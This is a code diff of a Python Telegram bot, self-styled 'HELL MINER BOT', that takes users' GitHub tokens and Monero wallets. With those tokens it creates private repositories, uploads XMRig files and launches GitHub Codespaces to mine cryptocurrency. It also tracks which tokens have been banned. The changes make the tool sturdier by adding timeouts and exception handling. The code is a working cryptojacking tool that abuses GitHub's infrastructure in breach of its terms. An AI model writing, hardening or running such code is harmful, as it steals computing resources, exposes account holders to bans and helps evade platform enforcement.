@@ -16,18 +16,26 @@ conn.commit()
 
 def upload_file(token, username, repo, filename, content):
     encoded = base64.b64encode(content.encode()).decode()
-    return requests.put(
-        f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
-        headers={"Authorization": f"token {token}"},
-        json={"message": f"Add {filename}", "content": encoded, "branch": "main"}
-    )
+    try:
+        return requests.put(
+            f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
+            headers={"Authorization": f"token {token}"},
+            json={"message": f"Add {filename}", "content": encoded, "branch": "main"},
+            timeout=10
+        )
+    except:
+        return None
 
 def create_two_repos_and_codespaces(github_token, wallet, update=None):
     headers = {
         "Authorization": f"token {github_token}",
         "Accept": "application/vnd.github+json"
     }
-    user_info = requests.get("https://api.github.com/user", headers=headers).json()
+    try:
+        user_info = requests.get("https://api.github.com/user", headers=headers, timeout=10).json()
+    except:
+        return None, False
+
     username = user_info.get("login")
     if not username:
         return None, False
@@ -49,40 +57,48 @@ chmod +x xmrig
 
     for i in range(2):
         repo_name = f"xmrig-{os.urandom(3).hex()}"
-        repo_resp = requests.post(
-            "https://api.github.com/repos/github/codespaces-blank/generate",
-            headers=headers,
-            json={
-                "owner": username,
-                "name": repo_name,
-                "private": True
-            }
-        )
-        if repo_resp.status_code != 201:
+        try:
+            repo_resp = requests.post(
+                "https://api.github.com/repos/github/codespaces-blank/generate",
+                headers=headers,
+                json={
+                    "owner": username,
+                    "name": repo_name,
+                    "private": True
+                },
+                timeout=10
+            )
+        except:
             if update:
                 update.message.reply_text(f"❌ Failed to create repo {i+1}")
+            continue
+
+        if repo_resp.status_code != 201:
+            if update:
+                update.message.reply_text(f"❌ Repo {i+1} creation failed ({repo_resp.status_code})")
             continue
 
         for fname, content in files.items():
             upload_file(github_token, username, repo_name, fname, content)
 
-        time.sleep(8)
+        time.sleep(6)
 
-        repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers).json()
-        repo_id = repo_data.get("id")
-        if not repo_id:
+        try:
+            repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers, timeout=10).json()
+            repo_id = repo_data.get("id")
+            if not repo_id:
+                continue
+
+            resp = requests.post(
+                "https://api.github.com/user/codespaces",
+                headers=headers,
+                json={"repository_id": repo_id, "ref": "main"},
+                timeout=10
+            )
+            if update:
+                update.message.reply_text(f"📦 Codespace {i+1}: {resp.status_code}")
+        except:
             continue
-
-        resp = requests.post(
-            "https://api.github.com/user/codespaces",
-            headers=headers,
-            json={
-                "repository_id": repo_id,
-                "ref": "main"
-            }
-        )
-        if update:
-            update.message.reply_text(f"📦 Codespace {i+1}: {resp.status_code} - {resp.text[:100]}...")
 
     return username, True
 
@@ -114,7 +130,7 @@ async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         username, success = create_two_repos_and_codespaces(github_token, wallet, update)
         if success:
-            reply += f"😈 GITHUB POSSESSED SUCCESSFULLY! 😈\n👤 Logged in as: {username}\nWait while I cast the spell of infinite mining...\n ✅  Codespaces started and mining configured with XMRig 🧠💰\n\n"
+            reply += f"😈 Logged in as: {username}\n✅ Codespaces started with mining...\n\n"
         else:
             reply += f"❌ Token {github_token[:8]}... is invalid or failed\n\n"
 
@@ -126,37 +142,28 @@ async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tokens = c.fetchall()
     active = banned = 0
     for (token,) in tokens:
-        res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"})
-        if res.status_code == 200:
-            active += 1
-        else:
+        try:
+            res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"}, timeout=6)
+            if res.status_code == 200:
+                active += 1
+            else:
+                banned += 1
+        except:
             banned += 1
     total = active + banned
     await update.message.reply_text(
-        f"👤 Your GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}\n━━━━━━━━━━━━━━━"
+        f"👤 GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}"
     )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "😈 WELCOME TO HELL MINER BOT 😈\n"
-        "🔥 I AM DEVIL BY MUSTAFA... AND YOU'RE HERE TO BURN CPUs! 🔥\n\n"
-        "📖 HOW TO MAKE YOUR GITHUB WORK FOR YOU:\n"
-        "1️⃣ Type /wallet <your_monero_wallet>\n"
-        "✅  This will store your mining wallet\n"
-        "2️⃣ Type /token <your_github_token>\n"
-        "✅  I’ll rip GitHub apart and mine with it\n"
-        "3️⃣ Sit back and watch the magic ⚡\n"
-        "🤖 I’ll create repos, fire up Codespaces, and mine like a beast!\n\n"
-        "⛏️ Wanna check your status?\n"
-        "Type /check to see your Active and Banned tokens.\n\n"
-        "💀 Don’t worry, I never forget your wallet. Even if you restart, it stays in my evil memory!\n"
-        "---\n"
-        "❌  No admin needed — This is open to all brave souls.\n"
-        "😈 The darker your worker, the faster you mine.\n"
-        "👉 Ready to sell your mind to the Hashrate gods?\n"
-        "Then let's begin the ritual! 🔥"
+        "😈 WELCOME TO HELL MINER BOT 😈\n\n"
+        "📖 HOW TO MINE:\n"
+        "1️⃣ /wallet <your_monero_wallet>\n"
+        "2️⃣ /token <your_github_token>\n"
+        "3️⃣ Sit back and mine\n"
+        "4️⃣ /check - Token status\n"
     )
-
 
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 app.add_handler(CommandHandler("wallet", wallet))
